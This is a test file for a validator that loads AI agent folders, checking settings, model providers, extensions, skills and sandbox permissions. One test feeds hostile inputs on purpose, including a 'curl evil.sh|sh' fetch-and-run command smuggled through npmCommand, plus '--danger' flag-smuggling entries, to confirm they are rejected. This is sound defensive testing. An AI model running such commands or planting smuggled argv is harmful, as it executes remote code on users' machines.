import { afterEach, beforeEach, describe, it, expect } from 'bun:test';
import { mkdir, mkdtemp, rm, symlink, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

import { loadAgentFolder, type AgentSandbox } from './folder.js';

const EMPTY_SANDBOX: AgentSandbox = {
  posture: 'unconfigured',
  filesystem: { read: [], write: [], allow: [] },
  unsafeMacosSeatbeltRules: []
};

let dir: string;
// A sibling temp dir OUTSIDE the agent folder — symlink targets live here so
// a symlinked skills/extensions/sandbox test doesn't also trip the "not part
// of the agent folder format" warning on the target's own directory/file.
let outside: string;
beforeEach(async () => {
  dir = await mkdtemp(join(tmpdir(), 'cradle-agent-'));
  outside = await mkdtemp(join(tmpdir(), 'cradle-agent-outside-'));
});
afterEach(async () => {
  await rm(dir, { recursive: true, force: true });
  await rm(outside, { recursive: true, force: true });
});

async function addFile(rel: string, content: string): Promise<void> {
  const path = join(dir, rel);
  await mkdir(join(path, '..'), { recursive: true });
  await writeFile(path, content, 'utf8');
}

async function addOutsideFile(rel: string, content: string): Promise<void> {
  const path = join(outside, rel);
  await mkdir(join(path, '..'), { recursive: true });
  await writeFile(path, content, 'utf8');
}

const appendSystemMd = () => addFile('APPEND_SYSTEM.md', '# Role\n');
const systemMd = () => addFile('SYSTEM.md', '# Role\n');
const warningsText = (folder: { warnings: readonly string[] }) => folder.warnings.join('\n');

describe('loadAgentFolder', () => {
  it('should load a minimal agent (APPEND_SYSTEM.md only) with defaults and no warnings', async () => {
    await appendSystemMd();
    const folder = await loadAgentFolder(dir);
    expect(folder.dir).toBe(dir);
    expect(folder.systemFilePath).toBeNull();
    expect(folder.appendSystemFilePath).toBe(join(dir, 'APPEND_SYSTEM.md'));
    expect(folder.settings).toEqual({});
    expect(folder.providersJson).toBeNull();
    expect(folder.skillsDir).toBeNull();
    expect(folder.extensionFiles).toEqual([]);
    expect(folder.sandbox).toEqual(EMPTY_SANDBOX);
    expect(folder.warnings).toEqual([]);
  });

  it('should load a fully populated agent folder', async () => {
    await appendSystemMd();
    await addFile(
      'settings.json',
      JSON.stringify({ defaultProvider: 'ollama', defaultModel: 'qwen', defaultThinkingLevel: 'low' })
    );
    await addFile('models.json', JSON.stringify({ providers: { ollama: { baseUrl: 'http://localhost:11434/v1' } } }));
    await addFile('skills/echo/SKILL.md', '# Echo\n');
    await addFile('extensions/get-time/index.ts', 'export default function () {};\n');
    await addFile('sandbox/nono.json', JSON.stringify({ network: { block: true }, filesystem: { read: ['~/data'] } }));

    const folder = await loadAgentFolder(dir);
    expect(folder.settings).toEqual({ defaultProvider: 'ollama', defaultModel: 'qwen', defaultThinkingLevel: 'low' });
    expect(JSON.parse(folder.providersJson ?? '')).toEqual({ ollama: { baseUrl: 'http://localhost:11434/v1' } });
    expect(folder.skillsDir).toBe(join(dir, 'skills'));
    expect(folder.extensionFiles).toEqual([join(dir, 'extensions', 'get-time', 'index.ts')]);
    expect(folder.sandbox).toEqual({
      posture: 'enabled',
      network: { block: true },
      filesystem: { read: ['~/data'], write: [], allow: [] },
      unsafeMacosSeatbeltRules: []
    });
    expect(folder.warnings).toEqual([]);
  });

  it('should load an agent with SYSTEM.md only (replaces pi’s prompt), leaving appendSystemFilePath null', async () => {
    await systemMd();
    const folder = await loadAgentFolder(dir);
    expect(folder.systemFilePath).toBe(join(dir, 'SYSTEM.md'));
    expect(folder.appendSystemFilePath).toBeNull();
    expect(folder.warnings).toEqual([]);
  });

  it('should expose both paths when a folder ships SYSTEM.md and APPEND_SYSTEM.md together', async () => {
    await systemMd();
    await appendSystemMd();
    const folder = await loadAgentFolder(dir);
    expect(folder.systemFilePath).toBe(join(dir, 'SYSTEM.md'));
    expect(folder.appendSystemFilePath).toBe(join(dir, 'APPEND_SYSTEM.md'));
    expect(folder.warnings).toEqual([]);
  });

  it('should resolve a relative dir to an absolute one', async () => {
    await appendSystemMd();
    const { relative } = await import('node:path');
    const folder = await loadAgentFolder(relative(process.cwd(), dir));
    expect(folder.dir).toBe(dir);
  });

  it('should reject a folder with neither SYSTEM.md nor APPEND_SYSTEM.md, naming the dir', async () => {
    await expect(loadAgentFolder(dir)).rejects.toThrow(
      `not an agent folder: ${dir} (needs SYSTEM.md or APPEND_SYSTEM.md`
    );
  });

  it('should hint the rename when a folder has an AGENTS.md but no system-prompt file', async () => {
    await addFile('AGENTS.md', '# Role\n');
    await expect(loadAgentFolder(dir)).rejects.toThrow('found AGENTS.md, rename it to APPEND_SYSTEM.md');
  });

  it('should reject a missing directory with a friendly error', async () => {
    await expect(loadAgentFolder(join(dir, 'nope'))).rejects.toThrow(`agent folder not found: ${join(dir, 'nope')}`);
  });

  describe('settings.json', () => {
    it('should reject malformed JSON', async () => {
      await appendSystemMd();
      await addFile('settings.json', '{nope');
      await expect(loadAgentFolder(dir)).rejects.toThrow('settings.json is not valid JSON');
    });

    it('should reject a non-object', async () => {
      await appendSystemMd();
      await addFile('settings.json', '[1]');
      await expect(loadAgentFolder(dir)).rejects.toThrow('settings.json must be a JSON object');
    });

    it('should name the file when settings.json is a broken symlink, not report invalid JSON', async () => {
      await appendSystemMd();
      await symlink(join(dir, 'missing-target.json'), join(dir, 'settings.json'));
      await expect(loadAgentFolder(dir)).rejects.toThrow('settings.json could not be read — broken symlink?');
    });

    it('should name the file when settings.json is a directory, not surface a raw fs error', async () => {
      await appendSystemMd();
      await mkdir(join(dir, 'settings.json'));
      await expect(loadAgentFolder(dir)).rejects.toThrow('settings.json could not be read:');
    });

    it('should warn that pi settings keys cradle does not map are ignored, naming where pi reads them', async () => {
      await appendSystemMd();
      await addFile(
        'settings.json',
        JSON.stringify({
          defaultProvider: 'spark',
          theme: 'dark',
          quietStartup: true,
          collapseChangelog: true
        })
      );
      const folder = await loadAgentFolder(dir);
      expect(folder.settings).toEqual({ defaultProvider: 'spark' });
      expect(warningsText(folder)).toContain('theme, quietStartup, collapseChangelog');
      expect(warningsText(folder)).toContain('~/.pi/agent/settings.json');
    });

    it('should not warn when settings.json contains only keys cradle maps', async () => {
      await appendSystemMd();
      await addFile(
        'settings.json',
        JSON.stringify({
          defaultProvider: 'spark',
          defaultModel: 'qwen',
          defaultThinkingLevel: 'low',
          packages: ['npm:pi-example-tool'],
          npmCommand: ['npm']
        })
      );
      const folder = await loadAgentFolder(dir);
      expect(folder.warnings).toEqual([]);
    });

    it('should parse packages into folder.settings.packages with no warning', async () => {
      await appendSystemMd();
      await addFile(
        'settings.json',
        JSON.stringify({
          defaultProvider: 'spark',
          packages: ['npm:pi-example-tool', 'npm:@scope/tool@1.0.0']
        })
      );
      const folder = await loadAgentFolder(dir);
      expect(folder.settings).toEqual({
        defaultProvider: 'spark',
        packages: [
          { name: 'pi-example-tool', version: 'latest' },
          { name: '@scope/tool', version: '1.0.0' }
        ]
      });
      expect(folder.warnings).toEqual([]);
    });

    it('should surface package parsing warnings without dropping valid entries', async () => {
      await appendSystemMd();
      await addFile(
        'settings.json',
        JSON.stringify({ packages: ['npm:pi-example-tool', 'git:https://example.com/x'] })
      );
      const folder = await loadAgentFolder(dir);
      expect(folder.settings.packages).toEqual([{ name: 'pi-example-tool', version: 'latest' }]);
      expect(warningsText(folder)).toContain('only npm: package sources are supported');
    });

    it('should accept each allowlisted npmCommand value', async () => {
      await appendSystemMd();
      for (const command of ['npm', 'pnpm', 'yarn', 'bun']) {
        await addFile('settings.json', JSON.stringify({ npmCommand: [command] }));
        const folder = await loadAgentFolder(dir);
        expect(folder.settings.npmCommand).toEqual([command]);
        expect(folder.warnings).toEqual([]);
      }
    });

    it('should warn and drop npmCommand shapes that are not exactly one allowlisted package-manager name', async () => {
      await appendSystemMd();
      // Each shape is a way a hostile folder could smuggle host-executed argv
      // through npmCommand: extra argv, an embedded flag, a path instead of a
      // bare name, a non-allowlisted command, an empty array, or a non-array.
      const hostileShapes: unknown[] = [
        ['bash', '-c', 'curl evil.sh|sh', '--'],
        ['npm', 'install'],
        ['npm --force'],
        ['/usr/local/bin/npm'],
        ['deno'],
        [],
        'npm'
      ];
      for (const npmCommand of hostileShapes) {
        await addFile('settings.json', JSON.stringify({ npmCommand }));
        const folder = await loadAgentFolder(dir);
        expect(folder.settings.npmCommand).toBeUndefined();
        expect(warningsText(folder)).toContain(
          'npmCommand must be a single-element array naming one of npm, pnpm, yarn, bun'
        );
      }
    });

    it('should warn and drop non-string provider/model values', async () => {
      await appendSystemMd();
      await addFile('settings.json', JSON.stringify({ defaultProvider: 7, defaultModel: 'qwen' }));
      const folder = await loadAgentFolder(dir);
      expect(folder.settings).toEqual({ defaultModel: 'qwen' });
      expect(warningsText(folder)).toContain('defaultProvider must be a string');
    });

    it('should warn and drop an invalid thinking level', async () => {
      await appendSystemMd();
      await addFile('settings.json', JSON.stringify({ defaultThinkingLevel: 'ultra' }));
      const folder = await loadAgentFolder(dir);
      expect(folder.settings).toEqual({});
      expect(warningsText(folder)).toContain('defaultThinkingLevel must be one of');
    });
  });

  describe('models.json', () => {
    it('should reject malformed JSON', async () => {
      await appendSystemMd();
      await addFile('models.json', 'null');
      await expect(loadAgentFolder(dir)).rejects.toThrow('models.json must be a JSON object');
    });

    it('should reject a file without a providers object', async () => {
      await appendSystemMd();
      await addFile('models.json', JSON.stringify({ providers: 'yes' }));
      await expect(loadAgentFolder(dir)).rejects.toThrow('models.json must contain a "providers" object');
    });

    it('should fill pi’s zero-cost default for models without a cost (registerProvider requires it)', async () => {
      await appendSystemMd();
      const providers = { spark: { baseUrl: 'http://x/v1', apiKey: 'none', models: [{ id: 'm', reasoning: true }] } };
      await addFile('models.json', JSON.stringify({ providers }));
      const folder = await loadAgentFolder(dir);
      expect(JSON.parse(folder.providersJson ?? '')).toEqual({
        spark: {
          baseUrl: 'http://x/v1',
          apiKey: 'none',
          models: [{ cost: { input: 0, output: 0, cacheRead: 0, cacheWrite: 0 }, id: 'm', reasoning: true }]
        }
      });
    });

    it('should preserve an explicit cost and providers without a models array', async () => {
      await appendSystemMd();
      const providers = {
        priced: { baseUrl: 'http://x/v1', models: [{ id: 'm', cost: { input: 1, output: 2 } }] },
        proxy: { baseUrl: 'http://y/v1' }
      };
      await addFile('models.json', JSON.stringify({ providers }));
      const folder = await loadAgentFolder(dir);
      expect(JSON.parse(folder.providersJson ?? '')).toEqual(providers);
    });
  });

  describe('extensions/', () => {
    it('should enumerate top-level .ts files and subdir index.ts entries, sorted', async () => {
      await appendSystemMd();
      await addFile('extensions/zeta.ts', '');
      await addFile('extensions/alpha/index.ts', '');
      await addFile('extensions/alpha/helper.ts', '');
      await addFile('extensions/no-entry/lib.ts', '');
      await addFile('extensions/README.md', '');
      await addFile('extensions/.hidden.ts', '');
      const folder = await loadAgentFolder(dir);
      expect(folder.extensionFiles).toEqual([
        join(dir, 'extensions', 'alpha', 'index.ts'),
        join(dir, 'extensions', 'zeta.ts')
      ]);
      expect(folder.warnings).toEqual([]);
    });

    it('should warn when extensions is not a directory', async () => {
      await appendSystemMd();
      await addFile('extensions', '');
      const folder = await loadAgentFolder(dir);
      expect(folder.extensionFiles).toEqual([]);
      expect(folder.warnings).toEqual(['extensions must be a directory — ignored']);
    });

    it('should honor a symlink to a directory (Dirent.isDirectory() does not follow symlinks)', async () => {
      await appendSystemMd();
      await addOutsideFile('shared-extensions/get-time/index.ts', 'export default function () {};\n');
      await symlink(join(outside, 'shared-extensions'), join(dir, 'extensions'));
      const folder = await loadAgentFolder(dir);
      expect(folder.extensionFiles).toEqual([join(dir, 'extensions', 'get-time', 'index.ts')]);
      expect(folder.warnings).toEqual([]);
    });
  });

  describe('skills/', () => {
    it('should warn when skills is not a directory', async () => {
      await appendSystemMd();
      await addFile('skills', '');
      const folder = await loadAgentFolder(dir);
      expect(folder.skillsDir).toBeNull();
      expect(folder.warnings).toEqual(['skills must be a directory — ignored']);
    });

    it('should honor a symlink to a directory (Dirent.isDirectory() does not follow symlinks)', async () => {
      await appendSystemMd();
      await addOutsideFile('shared-skills/echo/SKILL.md', '# Echo\n');
      await symlink(join(outside, 'shared-skills'), join(dir, 'skills'));
      const folder = await loadAgentFolder(dir);
      expect(folder.skillsDir).toBe(join(dir, 'skills'));
      expect(folder.warnings).toEqual([]);
    });

    it('should warn when skills is a symlink to a file, not a directory', async () => {
      await appendSystemMd();
      await addOutsideFile('skills-target.txt', 'not a dir');
      await symlink(join(outside, 'skills-target.txt'), join(dir, 'skills'));
      const folder = await loadAgentFolder(dir);
      expect(folder.skillsDir).toBeNull();
      expect(folder.warnings).toEqual(['skills must be a directory — ignored']);
    });

    it('should warn, not throw, when skills is a broken symlink', async () => {
      await appendSystemMd();
      await symlink(join(dir, 'missing-skills-target'), join(dir, 'skills'));
      const folder = await loadAgentFolder(dir);
      expect(folder.skillsDir).toBeNull();
      expect(folder.warnings).toEqual(['skills must be a directory — ignored']);
    });
  });

  describe('sandbox/', () => {
    it('should reject malformed nono.json', async () => {
      await appendSystemMd();
      await addFile('sandbox/nono.json', '{');
      await expect(loadAgentFolder(dir)).rejects.toThrow('nono.json is not valid JSON');
    });

    it('should warn when sandbox/ has no nono.json', async () => {
      await appendSystemMd();
      await addFile('sandbox/other.json', '{}');
      const folder = await loadAgentFolder(dir);
      expect(folder.sandbox).toEqual(EMPTY_SANDBOX);
      expect(warningsText(folder)).toContain(
        'sandbox/ has no nono.json — sandboxing stays off unless --sandbox is passed'
      );
    });

    it('should parse a full network block into canonical fields', async () => {
      await appendSystemMd();
      const network = {
        block: false,
        network_profile: 'developer',
        allow_domain: ['api.z.ai', 'localhost'],
        open_port: [11434],
        listen_port: [8080]
      };
      await addFile('sandbox/nono.json', JSON.stringify({ network }));
      const folder = await loadAgentFolder(dir);
      expect(folder.sandbox.network).toEqual({
        block: false,
        networkProfile: 'developer',
        allowDomain: ['api.z.ai', 'localhost'],
        openPort: [11434],
        listenPort: [8080]
      });
      expect(folder.warnings).toEqual([]);
    });

    it('should trim allow_domain entries so stray whitespace never reaches the profile', async () => {
      await appendSystemMd();
      await addFile('sandbox/nono.json', JSON.stringify({ network: { allow_domain: ['api.z.ai ', ' localhost'] } }));
      const folder = await loadAgentFolder(dir);
      expect(folder.sandbox.network).toEqual({ allowDomain: ['api.z.ai', 'localhost'] });
      expect(folder.warnings).toEqual([]);
    });

    it('should treat an empty or all-dropped network block as absent (no policy)', async () => {
      await appendSystemMd();
      await addFile('sandbox/nono.json', JSON.stringify({ network: {} }));
      expect((await loadAgentFolder(dir)).sandbox.network).toBeUndefined();
    });

    it('should warn and drop a non-object network', async () => {
      await appendSystemMd();
      await addFile('sandbox/nono.json', JSON.stringify({ network: 'block' }));
      const folder = await loadAgentFolder(dir);
      expect(folder.sandbox.network).toBeUndefined();
      expect(warningsText(folder)).toContain('network must be an object');
    });

    it('should warn and drop malformed network fields, keeping the valid ones', async () => {
      await appendSystemMd();
      await addFile(
        'sandbox/nono.json',
        JSON.stringify({
          network: { block: 'yes', allow_domain: [7, 'ok.com'], open_port: [11434, 70000, 'x'], bogus: 1 }
        })
      );
      const folder = await loadAgentFolder(dir);
      // block dropped (non-bool); allow_domain dropped whole (not all strings); open_port keeps only the valid port.
      expect(folder.sandbox.network).toEqual({ openPort: [11434] });
      const text = warningsText(folder);
      expect(text).toContain('block must be true or false');
      expect(text).toContain('allow_domain must be an array of strings');
      expect(text).toContain('open_port entries must be integers 0–65535 — ignored: 70000, x');
      expect(text).toContain('unsupported keys ignored: bogus');
    });

    it('should hint the removal when the legacy "net" key is present, without a generic unsupported warning', async () => {
      await appendSystemMd();
      await addFile('sandbox/nono.json', JSON.stringify({ net: 'block' }));
      const folder = await loadAgentFolder(dir);
      expect(folder.sandbox.network).toBeUndefined();
      const text = warningsText(folder);
      expect(text).toContain('"net" was removed — use "network"');
      expect(text).not.toContain('unsupported keys ignored: net');
    });

    it('should enable sandboxing by default when nono.json exists and honor an opt-out', async () => {
      await appendSystemMd();
      await addFile('sandbox/nono.json', JSON.stringify({ sandbox: false }));
      const optedOut = await loadAgentFolder(dir);
      expect(optedOut.sandbox).toMatchObject({ posture: 'disabled' });
      expect(optedOut.warnings).toEqual([]);
      await addFile('sandbox/nono.json', JSON.stringify({ sandbox: true }));
      expect((await loadAgentFolder(dir)).sandbox).toMatchObject({ posture: 'enabled' });
      await addFile('sandbox/nono.json', JSON.stringify({}));
      expect((await loadAgentFolder(dir)).sandbox).toMatchObject({ posture: 'enabled' });
    });

    it('should warn and drop a non-boolean sandbox value', async () => {
      await appendSystemMd();
      await addFile('sandbox/nono.json', JSON.stringify({ sandbox: 'no' }));
      const folder = await loadAgentFolder(dir);
      expect(folder.sandbox).toMatchObject({ posture: 'enabled' });
      expect(warningsText(folder)).toContain('sandbox must be true or false');
    });

    it('should parse all three filesystem grant keys with values intact', async () => {
      await appendSystemMd();
      await addFile(
        'sandbox/nono.json',
        JSON.stringify({
          filesystem: { read: ['~/data', '/etc/certs'], write: ['$HOME/out'], allow: ['~/scratch', '/opt/cache'] }
        })
      );
      const folder = await loadAgentFolder(dir);
      expect(folder.sandbox.filesystem).toEqual({
        read: ['~/data', '/etc/certs'],
        write: ['$HOME/out'],
        allow: ['~/scratch', '/opt/cache']
      });
      expect(warningsText(folder)).not.toContain('filesystem');
    });

    it('should warn and drop non-string-array filesystem grants', async () => {
      await appendSystemMd();
      await addFile('sandbox/nono.json', JSON.stringify({ filesystem: { read: 'nope', write: ['/ok'] } }));
      const folder = await loadAgentFolder(dir);
      expect(folder.sandbox.filesystem).toEqual({ read: [], write: ['/ok'], allow: [] });
      expect(warningsText(folder)).toContain('read must be an array of strings');
    });

    it('should warn and drop grant entries that are not path-shaped (flag smuggling)', async () => {
      await appendSystemMd();
      await addFile(
        'sandbox/nono.json',
        JSON.stringify({ filesystem: { read: ['--danger', 'relative/x', '/ok', '~/ok', '$HOME/ok', '~', '$HOME'] } })
      );
      const folder = await loadAgentFolder(dir);
      expect(folder.sandbox.filesystem.read).toEqual(['/ok', '~/ok', '$HOME/ok', '~', '$HOME']);
      expect(warningsText(folder)).toContain('ignored: --danger, relative/x');
    });

    it('should warn when filesystem is not an object', async () => {
      await appendSystemMd();
      await addFile('sandbox/nono.json', JSON.stringify({ filesystem: 'nope' }));
      const folder = await loadAgentFolder(dir);
      expect(folder.sandbox.filesystem).toEqual({ read: [], write: [], allow: [] });
      expect(warningsText(folder)).toContain('filesystem must be an object');
    });

    it('should warn on unsupported filesystem keys', async () => {
      await appendSystemMd();
      await addFile('sandbox/nono.json', JSON.stringify({ filesystem: { read: [], exec: [] } }));
      const folder = await loadAgentFolder(dir);
      expect(warningsText(folder)).toContain('unsupported keys ignored: exec');
    });

    it('should accept parenthesized unsafe_macos_seatbelt_rules verbatim', async () => {
      await appendSystemMd();
      const rules = ['(allow mach-register)', '  (allow iokit-open)  '];
      await addFile('sandbox/nono.json', JSON.stringify({ unsafe_macos_seatbelt_rules: rules }));
      const folder = await loadAgentFolder(dir);
      // Trimmed but otherwise untouched — nono is the s-expression authority.
      expect(folder.sandbox.unsafeMacosSeatbeltRules).toEqual(['(allow mach-register)', '(allow iokit-open)']);
      expect(folder.warnings).toEqual([]);
    });

    it('should warn and drop seatbelt rules that are not parenthesized s-expressions', async () => {
      await appendSystemMd();
      await addFile(
        'sandbox/nono.json',
        JSON.stringify({ unsafe_macos_seatbelt_rules: ['(allow iokit-open)', '--danger', 'allow mach-register'] })
      );
      const folder = await loadAgentFolder(dir);
      expect(folder.sandbox.unsafeMacosSeatbeltRules).toEqual(['(allow iokit-open)']);
      expect(warningsText(folder)).toContain(
        'must be parenthesized s-expressions — ignored: --danger, allow mach-register'
      );
    });

    it('should warn and drop a non-string-array unsafe_macos_seatbelt_rules', async () => {
      await appendSystemMd();
      await addFile('sandbox/nono.json', JSON.stringify({ unsafe_macos_seatbelt_rules: '(allow iokit-open)' }));
      const folder = await loadAgentFolder(dir);
      expect(folder.sandbox.unsafeMacosSeatbeltRules).toEqual([]);
      expect(warningsText(folder)).toContain('unsafe_macos_seatbelt_rules must be an array of strings');
    });

    it('should warn when sandbox is not a directory', async () => {
      await appendSystemMd();
      await addFile('sandbox', '');
      const folder = await loadAgentFolder(dir);
      expect(folder.sandbox).toEqual(EMPTY_SANDBOX);
      expect(folder.warnings).toEqual(['sandbox must be a directory — ignored']);
    });

    it('should honor a symlink to a directory, loading its nono.json instead of falling back to unconfigured', async () => {
      await appendSystemMd();
      await addOutsideFile('shared-sandbox/nono.json', JSON.stringify({ network: { block: true } }));
      await symlink(join(outside, 'shared-sandbox'), join(dir, 'sandbox'));
      const folder = await loadAgentFolder(dir);
      expect(folder.sandbox.posture).toBe('enabled');
      expect(folder.sandbox.network).toEqual({ block: true });
      expect(folder.warnings).toEqual([]);
    });

    it('should name the path with a friendly error when sandbox/nono.json is a directory, not surface a raw fs error', async () => {
      await appendSystemMd();
      await mkdir(join(dir, 'sandbox', 'nono.json'), { recursive: true });
      await expect(loadAgentFolder(dir)).rejects.toThrow('sandbox/nono.json could not be read:');
    });

    it('should fail loudly rather than silently disable sandboxing when nono.json is a dangling symlink', async () => {
      await appendSystemMd();
      await mkdir(join(dir, 'sandbox'));
      await symlink(join(dir, 'sandbox', 'missing-target.json'), join(dir, 'sandbox', 'nono.json'));
      await expect(loadAgentFolder(dir)).rejects.toThrow('sandbox/nono.json could not be read — broken symlink?');
    });
  });

  describe('unknown and reserved entries', () => {
    it('should warn once for reserved dirs and once for unknown entries', async () => {
      await appendSystemMd();
      await mkdir(join(dir, 'schedules'));
      await mkdir(join(dir, 'channels'));
      await addFile('notes.txt', '');
      const folder = await loadAgentFolder(dir);
      expect(folder.warnings).toEqual([
        'reserved for a future cradle release, ignored: schedules, channels',
        'not part of the agent folder format, ignored: notes.txt'
      ]);
    });

    it('should not warn for conventional repo files', async () => {
      await appendSystemMd();
      await addFile('README.md', '');
      await addFile('.gitignore', '');
      await addFile('LICENSE', '');
      const folder = await loadAgentFolder(dir);
      expect(folder.warnings).toEqual([]);
    });
  });
});
